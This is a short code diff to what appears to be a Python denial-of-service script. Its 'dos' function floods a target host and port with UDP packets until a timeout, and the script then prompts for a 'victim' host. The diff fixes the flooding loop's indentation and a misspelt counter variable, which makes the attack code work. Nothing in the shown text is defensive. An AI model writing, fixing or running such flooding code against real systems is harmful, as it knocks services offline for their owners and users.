@@ -28,22 +28,22 @@ def dos(target,port,duration,name,strng):
 	timeout = time.time() + duration
 	sent = 0
 	while 1:
-	if time.time() > timeout:
-		break		
-	else:
-		pass
-	try:
-		s.sendto(data, (target, port))
-		s.sendto(data, (target, port))
-		s.sendto(data, (target, port))
-		s.sendto(data, (target, port))
-		s.sendto(data, (target, port))
-	except:
-		pass
-	if name in daemonslayer:
-		break
-	sent = sent + 5
-	sys.stdout.write("%s Packets: %s\r\n"%(name, send))
+		if time.time() > timeout:
+			break		
+		else:
+			pass
+		try:
+			s.sendto(data, (target, port))
+			s.sendto(data, (target, port))
+			s.sendto(data, (target, port))
+			s.sendto(data, (target, port))
+			s.sendto(data, (target, port))
+		except:
+			pass
+		if name in daemonslayer:
+			break
+		sent = sent + 5
+		sys.stdout.write("%s Packets: %s\r\n"%(name, sent))
 
 credits()
 victim = raw_input("Host: ")
